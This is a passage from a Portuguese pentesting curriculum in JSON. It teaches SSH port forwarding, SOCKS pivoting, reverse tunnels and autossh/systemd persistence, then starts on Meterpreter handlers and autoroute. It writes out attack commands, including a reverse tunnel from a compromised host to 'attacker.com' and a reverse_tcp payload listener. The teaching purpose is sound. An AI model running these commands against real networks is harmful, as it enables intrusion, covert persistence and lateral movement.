                                  "title": "Executar o Túnel SSH Local",
                                  "subSteps": [
                                    "Execute o comando no terminal local: 'ssh -fN -L 8080:192.168.1.100:80 user@192.168.1.10'.",
                                    "Monitore o processo: use 'ps aux | grep ssh' para verificar se o túnel está rodando.",
                                    "Verifique binding da porta local: 'netstat -tlnp | grep 8080' ou 'ss -tlnp | grep 8080'.",
                                    "Mantenha o túnel ativo: evite matar o processo pai e use nohup se necessário.",
                                    "Registre PID para gerenciamento futuro: 'echo $! > tunnel.pid' após execução."
                                  ],
                                  "verification": "Processo SSH visível em ps/netstat e sem erros no log verbose.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Terminal ativo",
                                    "Ferramentas de monitoramento (ps, netstat/ss)"
                                  ],
                                  "tips": "Combine com -D para SOCKS proxy se precisar de múltiplos forwards.",
                                  "learningObjective": "Executar e gerenciar persistentemente um túnel SSH local em background.",
                                  "commonMistakes": [
                                    "Túnel não em background (-f ausente), bloqueando terminal",
                                    "Porta local não bindada por falta de privilégios",
                                    "Pivot_host desconectado causando falha silenciosa"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar o Túnel",
                                  "subSteps": [
                                    "Teste acesso local: 'curl http://localhost:8080' ou abra browser em http://localhost:8080.",
                                    "Confirme forward remoto: do browser/local, deve acessar serviço no remote_host:remote_port via pivot.",
                                    "Teste falhas: pare o serviço remoto e verifique erro  Connection refused.",
                                    "Monitore tráfego: use 'tcpdump -i lo port 8080' para capturar pacotes.",
                                    "Finalize: mate o túnel com 'kill $(cat tunnel.pid)' ou 'ssh -S none -O exit user@pivot_host'."
                                  ],
                                  "verification": "Acesso bem-sucedido a http://localhost:8080 redireciona conteúdo do remote_host:80.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Browser web ou curl/wget",
                                    "tcpdump ou Wireshark para monitoramento"
                                  ],
                                  "tips": "Teste com nc (netcat): 'nc -l 8080' local vs remoto para simplicidade.",
                                  "learningObjective": "Validar funcionalidade do túnel e debugar problemas comuns de conectividade.",
                                  "commonMistakes": [
                                    "Acessar IP público em vez de localhost",
                                    "Firewall no pivot bloqueando forward",
                                    "Serviço remoto não escutando na interface correta"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um pentest, você tem acesso SSH a um pivot_host (10.0.0.10) em rede DMZ. Um web server interno (192.168.56.101:80) só é acessível dali. Execute 'ssh -fN -L 8080:192.168.56.101:80 kali@10.0.0.10'. Agora, acesse http://localhost:8080 no seu Kali local para enumerar o web app interno via túnel.",
                              "finalVerifications": [
                                "Túnel SSH ativo e porta local bindada (netstat/ss confirma).",
                                "Acesso via localhost:local_port alcança remote_host:remote_port sem erros.",
                                "Tráfego roteado corretamente via pivot_host (tcpdump mostra forwards).",
                                "Túnel persiste em background e pode ser encerrado graciosamente.",
                                "Nenhum vazamento de tráfego fora do túnel (localhost only).",
                                "Debug verbose (-v) não mostra erros de autenticação ou binding."
                              ],
                              "assessmentCriteria": [
                                "Comando SSH -L sintaticamente correto com opções adequadas (-fN).",
                                "Pré-requisitos (acesso SSH, portas livres) verificados antes da execução.",
                                "Teste de conectividade end-to-end bem-sucedido com curl/browser.",
                                "Gerenciamento do processo (PID, kill) demonstrado.",
                                "Identificação e correção de pelo menos um erro comum (ex: porta em uso).",
                                "Explicação clara do fluxo: local -> pivot -> remote."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Compreensão de NAT, port forwarding e roteamento.",
                                "Sistemas Operacionais: Gerenciamento de processos Linux (ps, kill, netstat).",
                                "Segurança da Informação: Autenticação SSH, chaves assimétricas e pivoting em pentests.",
                                "Programação: Scripts bash para automação de túneis (ex: com expect ou autossh).",
                                "Análise de Redes: Uso de tcpdump/Wireshark para inspecionar tráfego tunelado."
                              ],
                              "realWorldApplication": "Em operações de ethical hacking e red teaming, túneis SSH locais são essenciais para pivoting em redes segmentadas, permitindo acesso a hosts internos sem exposição direta, como em CTFs (ex: HackTheBox) ou assessments reais de penetração onde o atacante usa um host comprometido como pivot para explorar segmentos restritos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.3.2",
                            "name": "Criar Túnel SSH Dinâmico (SOCKS)",
                            "description": "Executar 'ssh -D local_port user@pivot_host' para criar um proxy SOCKS dinâmico e integrá-lo com ferramentas de rede para pivoting.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar Autenticação SSH Segura",
                                  "subSteps": [
                                    "Verifique se você tem acesso SSH ao pivot_host com credenciais válidas.",
                                    "Gere um par de chaves SSH usando 'ssh-keygen -t ed25519' se não existir.",
                                    "Copie a chave pública para o pivot_host com 'ssh-copy-id user@pivot_host'.",
                                    "Teste a conexão SSH básica com 'ssh user@pivot_host' para confirmar autenticação sem senha.",
                                    "Configure o arquivo ~/.ssh/config para simplificar conexões futuras."
                                  ],
                                  "verification": "Conexão SSH ao pivot_host sem prompt de senha e sem erros de autenticação.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal Linux/Mac/Windows com OpenSSH",
                                    "Acesso ao pivot_host",
                                    "Editor de texto para ~/.ssh/config"
                                  ],
                                  "tips": "Use chaves Ed25519 para maior segurança e performance; evite senhas em produção.",
                                  "learningObjective": "Entender e configurar autenticação SSH baseada em chaves para túneis seguros.",
                                  "commonMistakes": [
                                    "Usar senhas em vez de chaves (inseguro)",
                                    "Esquecer de definir permissões 600 em chaves privadas",
                                    "Não testar conexão básica antes do túnel"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar Comando para Criar Túnel SOCKS Dinâmico",
                                  "subSteps": [
                                    "Escolha uma porta local livre (ex: 1080) com 'netstat -tuln | grep 1080'.",
                                    "Execute 'ssh -D 1080 -C -N user@pivot_host' ( -C para compressão, -N sem comando remoto).",
                                    "Monitore o output para confirmação de conexão e ausência de erros.",
                                    "Deixe a sessão SSH rodando em foreground ou use screen/tmux para background.",
                                    "Verifique o processo com 'ps aux | grep ssh'."
                                  ],
                                  "verification": "Processo SSH rodando com porta local 1080 escutando (netstat confirma SOCKS proxy ativo).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal com SSH",
                                    "Acesso ao pivot_host",
                                    "Ferramenta netstat ou ss"
                                  ],
                                  "tips": "Use -f para fork em background; adicione -v para verbose logging em troubleshooting.",
                                  "learningObjective": "Dominar a sintaxe e opções do comando ssh -D para proxy SOCKS.",
                                  "commonMistakes": [
                                    "Porta já em uso",
                                    "Firewall bloqueando porta local",
                                    "Comando sem -N causando shell interativo desnecessário"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Ferramentas de Rede para Usar o Proxy SOCKS",
                                  "subSteps": [
                                    "Configure navegador (Firefox: Preferences > Network Settings > Manual proxy SOCKS5 localhost:1080).",
                                    "Para curl: 'curl --socks5 localhost:1080 http://internal-site.local'.",
                                    "Para nmap: 'nmap -sT --proxy socks4://localhost:1080 target.internal'.",
                                    "Teste com 'curl --socks5-hostname localhost:1080 ifconfig.me' para ver IP do pivot.",
                                    "Integre com Proxychains: edite /etc/proxychains.conf e rode 'proxychains nmap ...'."
                                  ],
                                  "verification": "Tráfego roteado via proxy: IP externo muda para o do pivot_host em whoami/ip checks.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Navegador Firefox/Chrome",
                                    "curl, nmap instalados",
                                    "Proxychains (opcional)"
                                  ],
                                  "tips": "Use SOCKS5 com hostname resolution (--socks5-hostname) para DNS via túnel.",
                                  "learningObjective": "Aplicar proxy SOCKS em ferramentas comuns para pivoting.",
                                  "commonMistakes": [
                                    "Configurar SOCKS4 em vez de SOCKS5",
                                    "Não habilitar DNS proxy",
                                    "Proxy não configurado globalmente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar Pivoting via Túnel",
                                  "subSteps": [
                                    "Acesse recurso interno via pivot (ex: http://192.168.1.100 no navegador).",
                                    "Execute scan Nmap através do túnel para hosts internos.",
                                    "Monitore tráfego com Wireshark filtrando porta 1080.",
                                    "Teste latência e throughput com múltiplas conexões.",
                                    "Finalize fechando túnel com Ctrl+C e verificando limpeza."
                                  ],
                                  "verification": "Acesso bem-sucedido a hosts internos invisíveis da máquina atacante.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Wireshark ou tcpdump",
                                    "Alvos internos acessíveis via pivot",
                                    "Nmap"
                                  ],
                                  "tips": "Combine com -L para port forwarding local se SOCKS não bastar.",
                                  "learningObjective": "Validar eficácia do túnel em cenários de pivoting reais.",
                                  "commonMistakes": [
                                    "Tráfego vazando fora do túnel",
                                    "Pivot sem roteamento para rede interna",
                                    "Túnel timeout por inatividade"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um pentest, com acesso a um servidor pivot (10.0.0.5), execute 'ssh -D 1080 user@10.0.0.5', configure Firefox para proxy SOCKS5 localhost:1080 e acesse http://192.168.1.100/admin da sua máquina externa, simulando pivoting para DMZ interna.",
                              "finalVerifications": [
                                "Túnel SOCKS ativo sem erros no log SSH.",
                                "Ferramentas (curl/nmap) roteiam tráfego via pivot (IP/IPv6 correto).",
                                "Acesso a pelo menos 3 hosts internos via túnel.",
                                "Sem vazamento de tráfego (Wireshark confirma).",
                                "Túnel fecha corretamente sem processos órfãos.",
                                "Latência aceitável (<500ms para pings internos)."
                              ],
                              "assessmentCriteria": [
                                "Comando SSH -D executado com opções corretas e sem erros.",
                                "Configuração de proxy em múltiplas ferramentas validada.",
                                "Pivoting funcional para rede interna demonstrado.",
                                "Segurança: autenticação por chave, sem senhas expostas.",
                                "Troubleshooting de problemas comuns resolvido.",
                                "Documentação de comandos e saídas fornecida."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Compreensão de proxy SOCKS e roteamento.",
                                "Sistemas Operacionais: Gerenciamento de SSH e processos Linux.",
                                "Programação: Scripts para automação de túneis (Bash/Python).",
                                "Ética e Direito: Uso legal em ethical hacking e conformidade.",
                                "Análise de Dados: Monitoramento de tráfego com Wireshark."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou pentests, túneis SSH SOCKS permitem pivoting sigiloso de DMZ para rede interna, acessando ativos críticos sem detecção direta, comum em certificações como OSCP."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.3.3",
                            "name": "Túnel SSH Reverso para Acesso Externo",
                            "description": "Configurar 'ssh -R remote_port:localhost:local_port user@external_host' do pivô para expor serviços internos ao atacante.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente de Teste",
                                  "subSteps": [
                                    "Configure duas máquinas virtuais: uma como pivô (Linux com serviço interno) e outra como host externo (acessível via SSH).",
                                    "Instale e configure o OpenSSH em ambas as máquinas (sudo apt install openssh-server no Ubuntu/Debian).",
                                    "Defina IPs estáticos: pivô (192.168.1.100), externo (192.168.1.200). Habilite autenticação por senha ou chave SSH.",
                                    "Desative temporariamente firewalls (ufw disable) para testes iniciais.",
                                    "Teste conectividade básica: ping entre as máquinas e ssh do pivô para o externo."
                                  ],
                                  "verification": "Conexão SSH bem-sucedida do pivô para o externo sem erros de autenticação ou rede.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "2 VMs Linux (ex: Ubuntu)",
                                    "OpenSSH",
                                    "Ferramenta de virtualização (VirtualBox/VMware)"
                                  ],
                                  "tips": "Use chaves SSH para autenticação segura e evite senhas em produção. Documente IPs e credenciais.",
                                  "learningObjective": "Configurar um ambiente isolado para simular pivoting em rede interna.",
                                  "commonMistakes": [
                                    "Firewall bloqueando porta 22",
                                    "IPs incorretos ou rede não bridged",
                                    "SSH não iniciado (systemctl status ssh)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e Iniciar Serviço Local no Pivô",
                                  "subSteps": [
                                    "Instale um servidor web simples no pivô (ex: sudo apt install apache2 ou python3 -m http.server 8080).",
                                    "Inicie o serviço na porta local desejada (ex: porta 8080 para um web server).",
                                    "Verifique se o serviço roda localmente: curl localhost:8080 ou acesse via browser no pivô.",
                                    "Crie um arquivo de teste (index.html) para confirmar exposição.",
                                    "Registre a porta local (local_port = 8080) para uso no túnel."
                                  ],
                                  "verification": "Serviço acessível via localhost:8080 no pivô, retornando conteúdo esperado.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Servidor web (Apache/Python http.server)",
                                    "Editor de texto (nano/vim)"
                                  ],
                                  "tips": "Use netstat -tuln | grep 8080 para confirmar porta em escuta. Escolha portas não privilegiadas (>1024).",
                                  "learningObjective": "Preparar um serviço interno para exposição via túnel reverso.",
                                  "commonMistakes": [
                                    "Serviço não iniciado",
                                    "Porta já em uso",
                                    "Permissões insuficientes para bind"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estabelecer o Túnel SSH Reverso",
                                  "subSteps": [
                                    "No pivô, execute o comando: ssh -R remote_port:localhost:local_port user@external_host (ex: ssh -R 9090:localhost:8080 attacker@192.168.1.200).",
                                    "Aceite a conexão no host externo se necessário.",
                                    "Mantenha a sessão SSH ativa (use -N -f para background: ssh -fN -R 9090:localhost:8080 user@external_host).",
                                    "Configure no externo para permitir túneis reversos (GatewayPorts yes em /etc/ssh/sshd_config e restart ssh).",
                                    "Verifique logs: journalctl -u ssh ou ssh -v para debug."
                                  ],
                                  "verification": "Sessão SSH estabelecida sem erros e túnel ativo (netstat -tuln no externo mostra porta remote_port em escuta).",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Cliente SSH no pivô",
                                    "Servidor SSH configurado no externo"
                                  ],
                                  "tips": "Adicione -i chave_privada para autenticação chave. Use autossh para persistência.",
                                  "learningObjective": "Executar comando SSH reverso para forwarding de portas.",
                                  "commonMistakes": [
                                    "GatewayPorts não yes no sshd_config",
                                    "Porta remota em uso",
                                    "Autenticação falha"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar e Testar Acesso via Túnel",
                                  "subSteps": [
                                    "No host externo, acesse o serviço tunelado: curl localhost:remote_port ou browser http://localhost:9090.",
                                    "Confirme que o conteúdo do serviço interno (pivô:8080) é exibido no externo.",
                                    "Teste persistência: abra nova sessão e verifique continuidade.",
                                    "Monitore tráfego: tcpdump -i lo port 9090 no externo.",
                                    "Reinicie serviço no pivô e confirme propagação."
                                  ],
                                  "verification": "Conteúdo do serviço interno acessível via remote_port no externo.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Cliente curl/browser",
                                    "tcpdump ou wireshark"
                                  ],
                                  "tips": "Use -L para túneis locais se necessário. Teste com múltiplas portas.",
                                  "learningObjective": "Validar funcionalidade do túnel reverso em simulação de ataque.",
                                  "commonMistakes": [
                                    "Túnel não bind em 0.0.0.0 (use -g)",
                                    "Sessão SSH caída",
                                    "SELinux/AppArmor bloqueando"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um pentest, do servidor pivô comprometido (192.168.1.100) rodando um dashboard na porta 8080, execute 'ssh -fN -R 9090:localhost:8080 pentester@attacker.com'. Agora, do servidor atacante externo, acesse http://localhost:9090 para ver o dashboard interno sem firewall bloqueando.",
                              "finalVerifications": [
                                "Túnel estabelecido e persistente por 5 minutos sem quedas.",
                                "Serviço interno acessível via remote_port no externo com conteúdo correto.",
                                "Logs SSH sem erros críticos.",
                                "Desconexão limpa não expõe serviço.",
                                "Configuração reproduzível em nova sessão."
                              ],
                              "assessmentCriteria": [
                                "Explicar mecanismo de forwarding reverso (porta remota bind no externo para local no pivô).",
                                "Configurar túnel sem consulta a documentação em <10 min.",
                                "Identificar e corrigir erros comuns (ex: GatewayPorts).",
                                "Aplicar em cenário com firewall ativo.",
                                "Discutir riscos de detecção (tráfego SSH visível)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de NAT, port forwarding e TCP/IP.",
                                "Administração Linux: Configuração SSH/sshd e serviços.",
                                "Segurança Cibernética: Pivoting, C2 e evasão de firewalls.",
                                "Programação: Scripts bash para automação de túneis (autossh)."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Ethical Hacking, permite expor serviços internos (ex: RDP, databases) de redes segmentadas para o C2 externo, bypassando firewalls outbound restritos, simulando ataques avançados como APTs."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.2.3.4",
                            "name": "Persistir e Automatizar Túnel SSH",
                            "description": "Usar autossh ou scripts com chaves SSH para manter túneis persistentes em caso de desconexões, simulando persistência em cenários Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Gerar e Configurar Chaves SSH para Autenticação Automatizada",
                                  "subSteps": [
                                    "Execute 'ssh-keygen -t ed25519 -f ~/.ssh/tunnel_key' para gerar um par de chaves sem passphrase.",
                                    "Copie a chave pública para o host remoto com 'ssh-copy-id -i ~/.ssh/tunnel_key.pub user@remote_host'.",
                                    "Teste a conexão sem senha: 'ssh -i ~/.ssh/tunnel_key user@remote_host'.",
                                    "Configure o ssh-agent para carregar a chave: 'ssh-add ~/.ssh/tunnel_key'.",
                                    "Ajuste permissões: 'chmod 600 ~/.ssh/tunnel_key'."
                                  ],
                                  "verification": "Conexão SSH bem-sucedida sem solicitação de senha ou passphrase.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux/Unix",
                                    "ssh-keygen",
                                    "ssh-copy-id",
                                    "Acesso inicial ao host remoto"
                                  ],
                                  "tips": "Use chaves ed25519 para melhor performance e segurança; evite passphrases em automações.",
                                  "learningObjective": "Dominar autenticação por chave pública para sessões SSH persistentes sem interação humana.",
                                  "commonMistakes": [
                                    "Gerar chaves com passphrase em cenários automatizados",
                                    "Permissões incorretas na chave privada (deve ser 600)",
                                    "Esquecer de copiar a chave pública corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar e Verificar Autossh",
                                  "subSteps": [
                                    "Instale autossh via gerenciador de pacotes: 'sudo apt install autossh' (Debian/Ubuntu) ou 'sudo yum install autossh' (CentOS).",
                                    "Verifique a instalação: 'autossh -V'.",
                                    "Configure opções básicas no ~/.ssh/config: 'Host tunnel HostName remote_host User user IdentityFile ~/.ssh/tunnel_key'.",
                                    "Teste comando simples: 'autossh -M 0 -f -N -L 8080:localhost:80 user@remote_host'.",
                                    "Monitore logs iniciais com 'autossh -M 20000:30000 -vvv'."
                                  ],
                                  "verification": "Autossh instalado e comando básico executa sem erros, mantendo conexão por 2 minutos.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Máquina com gerenciador de pacotes (apt/yum)",
                                    "Acesso root ou sudo",
                                    "Host remoto configurado"
                                  ],
                                  "tips": "Use monitor port 0 para método echo; portas monitor separadas evitam conflitos de firewall.",
                                  "learningObjective": "Compreender instalação e configuração inicial do autossh para reconexão automática.",
                                  "commonMistakes": [
                                    "Não instalar dependências como libssh",
                                    "Ignorar configuração de StrictHostKeyChecking=no em cenários de teste",
                                    "Portas monitor bloqueadas por firewall"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Túnel SSH Persistente com Autossh",
                                  "subSteps": [
                                    "Crie comando completo: 'autossh -M 0 -o \"ServerAliveInterval 30\" -o \"ServerAliveCountMax 3\" -N -T -L 8080:internal_host:80 user@remote_host'.",
                                    "Adicione opções de persistência: -o \"ExitOnForwardFailure yes\" -o \"StrictHostKeyChecking no\".",
                                    "Execute em background: 'autossh ... -f'.",
                                    "Verifique túnel ativo: 'netstat -tlnp | grep 8080' ou 'ss -tlnp | grep 8080'.",
                                    "Teste forwarding: 'curl http://localhost:8080' acessando serviço remoto."
                                  ],
                                  "verification": "Túnel forwarda tráfego corretamente e sobrevive a uma desconexão manual (kill processo).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Autossh instalado",
                                    "Chaves SSH configuradas",
                                    "Serviço interno para testar forwarding"
                                  ],
                                  "tips": "ServerAliveInterval mantém conexão viva; use -T para evitar alocação de TTY desnecessária.",
                                  "learningObjective": "Implementar opções avançadas de autossh para túneis robustos em cenários de rede instável.",
                                  "commonMistakes": [
                                    "Forwarding ports incorretas (L local:remote_host:remote_port)",
                                    "Omitir -N para não executar comandos remotos",
                                    "Firewall bloqueando portas locais/remotas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Automatizar Túnel com Script Bash e Systemd",
                                  "subSteps": [
                                    "Crie script ~/tunnel_ssh.sh: '#!/bin/bash\nwhile true; do autossh ...; sleep 10; done'.",
                                    "Torne executável: 'chmod +x ~/tunnel_ssh.sh'.",
                                    "Crie serviço systemd: /etc/systemd/system/ssh-tunnel.service com [Unit], [Service] (ExecStart=/path/to/script), [Install].",
                                    "Ative serviço: 'sudo systemctl daemon-reload; sudo systemctl enable --now ssh-tunnel'.",
                                    "Monitore: 'sudo systemctl status ssh-tunnel' e logs com 'journalctl -u ssh-tunnel -f'."
                                  ],
                                  "verification": "Serviço inicia automaticamente no boot e reconecta após reboot ou kill.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor de texto (nano/vim)",
                                    "Acesso root para systemd",
                                    "Script bash"
                                  ],
                                  "tips": "Use loop com sleep para retry simples; systemd é mais robusto para produção.",
                                  "learningObjective": "Automatizar túneis SSH para execução persistente em ambientes operacionais reais.",
                                  "commonMistakes": [
                                    "Script sem shebang ou permissões",
                                    "User/WorkingDirectory errado no systemd",
                                    "Restart=always não configurado no serviço"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar Persistência em Cenários Simulados Red Team",
                                  "subSteps": [
                                    "Simule desconexão: 'sudo systemctl stop ssh-tunnel; sleep 30; sudo systemctl start ssh-tunnel'.",
                                    "Teste reboot: 'sudo reboot' e verifique túnel pós-boot.",
                                    "Monitore com ferramentas: 'watch -n 5 \"ss -tlnp | grep 8080\"'.",
                                    "Simule pivoting: Use túnel para acessar host interno e executar nmap ou similar.",
                                    "Registre métricas: Tempo de reconexão, uptime com 'uptime' no remoto."
                                  ],
                                  "verification": "Túnel persiste por 30+ minutos com 100% reconexão automática em 5 testes de falha.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ambiente de teste com múltiplas VMs (atacante, pivot, alvo)",
                                    "Ferramentas como nmap, curl"
                                  ],
                                  "tips": "Use tmux/screen para sessões persistentes durante testes manuais.",
                                  "learningObjective": "Validar persistência em simulações realistas de operações Red Team.",
                                  "commonMistakes": [
                                    "Não simular falhas reais como perda de rede",
                                    "Ignorar logs para depuração",
                                    "Testes sem métricas quantitativas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório Red Team, configure um túnel autossh de uma VM atacante (192.168.1.10) para pivotar via host comprometido (10.0.0.5) acessando um servidor web interno (10.0.1.20:80) em porta local 8080. O script reconecta automaticamente após simular queda de rede, permitindo nmap -sV 127.0.0.1:8080 sem interrupção.",
                              "finalVerifications": [
                                "Túnel reconecta em <30 segundos após kill do processo ou perda de conectividade.",
                                "Forwarding de portas funciona bidirecionalmente (local para remoto e vice-versa).",
                                "Serviço systemd inicia no boot e mantém uptime >95% em teste de 1 hora.",
                                "Logs mostram detecção e retry automático sem intervenção manual.",
                                "Acesso pivotado permite execução de comandos/tools no host interno via túnel.",
                                "Nenhuma senha ou interação humana requerida durante operação."
                              ],
                              "assessmentCriteria": [
                                "Script/service executa sem erros de sintaxe ou autenticação (0 falhas em 10 runs).",
                                "Tempo médio de reconexão <20 segundos em cenários de falha simulada.",
                                "Uso eficiente de recursos: <5% CPU idle, sem vazamentos de processo zumbi.",
                                "Segurança: Chaves protegidas, StrictHostKeyChecking configurado adequadamente.",
                                "Documentação: Logs claros e verificáveis para auditoria.",
                                "Escalabilidade: Funciona em múltiplos túneis simultâneos sem conflitos."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Conceitos de port forwarding, NAT e monitoramento de conexões (netstat/ss).",
                                "Programação: Scripting Bash avançado com loops, traps e gerenciamento de erros.",
                                "Sistemas Operacionais: Serviços systemd, automação de boot e logging (journalctl).",
                                "Segurança: Gerenciamento de chaves criptográficas e hardening de SSH.",
                                "DevOps: Ferramentas de persistência como autossh em pipelines CI/CD."
                              ],
                              "realWorldApplication": "Em operações de Ethical Hacking e Red Team, túneis SSH persistentes automatizados mantêm acesso covert a redes internas durante campanhas prolongadas, permitindo pivoting contínuo para exploração de vulnerabilidades mesmo em ambientes com conectividade instável ou monitoramento ativo."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.3",
                    "name": "Uso de Meterpreter para Pivoting",
                    "description": "Exploração prática do payload Meterpreter no Metasploit para realizar pivoting avançado.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.3.1",
                        "name": "Introdução ao Meterpreter no Metasploit",
                        "description": "Conceito fundamental sobre o payload Meterpreter, suas características avançadas e como estabelecer sessões iniciais para preparar o pivoting em ambientes de ethical hacking.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.3.1.1",
                            "name": "Iniciar o Framework Metasploit e Configurar Ambiente",
                            "description": "Passos detalhados para lançar o msfconsole, atualizar módulos e preparar o listener para payloads Meterpreter, garantindo compatibilidade com pivoting.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Iniciar o msfconsole",
                                  "subSteps": [
                                    "Verifique se o Metasploit está instalado (ex: em Kali Linux, use 'apt update && apt install metasploit-framework').",
                                    "Abra um terminal como root ou sudo.",
                                    "Digite 'msfconsole' para lançar o console.",
                                    "Aguarde o banner de boot e o prompt 'msf6 >' aparecer.",
                                    "Execute 'msfupdate' se necessário para versão inicial."
                                  ],
                                  "verification": "O prompt 'msf6 >' aparece sem erros de boot ou dependências faltantes.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Kali Linux ou máquina com Metasploit instalado",
                                    "Acesso root/sudo",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Use uma VM isolada para evitar riscos; sempre rode como root para payloads.",
                                  "learningObjective": "Dominar o lançamento básico do Metasploit console em ambiente Linux.",
                                  "commonMistakes": [
                                    "Executar sem sudo levando a erros de permissão",
                                    "Ignorar dependências como Ruby ou PostgreSQL",
                                    "Usar versão desatualizada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Atualizar Módulos e Banco de Dados",
                                  "subSteps": [
                                    "No msfconsole, digite 'msfupdate' para sincronizar módulos.",
                                    "Inicie o banco de dados com 'db_status' (deve mostrar 'connected to msf').",
                                    "Execute 'db_rebuild_cache' para reconstruir cache de módulos.",
                                    "Verifique com 'search meterpreter' para listar exploits relacionados.",
                                    "Confirme atualizações com 'info exploit/multi/handler'."
                                  ],
                                  "verification": "'msfupdate' completa sem erros e 'db_status' mostra conexão ativa.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Conexão à internet estável",
                                    "Espaço em disco livre (>2GB)"
                                  ],
                                  "tips": "Atualize regularmente para novas vulnerabilidades; use proxy se atrás de firewall.",
                                  "learningObjective": "Garantir que o framework esteja atualizado e funcional para uso em testes.",
                                  "commonMistakes": [
                                    "Pular db_status levando a falhas em jobs",
                                    "Interromper msfupdate causando corrupção",
                                    "Não rebuild cache após updates"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Listener para Payloads Meterpreter",
                                  "subSteps": [
                                    "Digite 'use exploit/multi/handler'.",
                                    "Configure payload com 'set payload windows/meterpreter/reverse_tcp' (ou linux equivalente).",
                                    "Defina LHOST e LPORT: 'set LHOST 0.0.0.0' e 'set LPORT 4444'.",
                                    "Opcional: 'set ExitOnSession false' para múltiplas sessões.",
                                    "Execute 'exploit -j' para iniciar o handler em background."
                                  ],
                                  "verification": "Handler inicia e mostra 'Started reverse TCP handler on 0.0.0.0:4444'; job ID aparece.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Porta 4444 livre",
                                    "Firewall desabilitado para testes"
                                  ],
                                  "tips": "Use LHOST como IP da máquina atacante; teste com netcat primeiro: 'nc -lvp 4444'.",
                                  "learningObjective": "Preparar handler reverso compatível com Meterpreter para receber shells.",
                                  "commonMistakes": [
                                    "LHOST incorreto causando falha de conexão",
                                    "Porta em uso",
                                    "Payload incompatível com target OS"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Compatibilidade com Pivoting",
                                  "subSteps": [
                                    "Crie uma sessão simulada ou teste com 'sessions -l' (deve listar se conectada).",
                                    "Configure route para pivoting: 'use post/multi/manage/autoroute'; 'set SESSION 1'; 'run'.",
                                    "Verifique rotas com 'route print'.",
                                    "Teste comando: 'sessions -i 1' e 'getuid' no Meterpreter.",
                                    "Saia com 'exit' e kill job: 'jobs -k 0'."
                                  ],
                                  "verification": "Autoroute adiciona rota pivot e comandos Meterpreter executam sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Máquina vítima simulada (ex: Metasploitable VM)",
                                    "Exploit para gerar sessão inicial"
                                  ],
                                  "tips": "Sempre teste em lab isolado; use VPN para simular cenários reais.",
                                  "learningObjective": "Validar setup para pivoting via Meterpreter em redes internas.",
                                  "commonMistakes": [
                                    "Não setar SESSION ID correto",
                                    "Firewall bloqueando rotas pivot",
                                    "Sessão timeout por falta de persistência"
                                  ]
                                }
                              ],
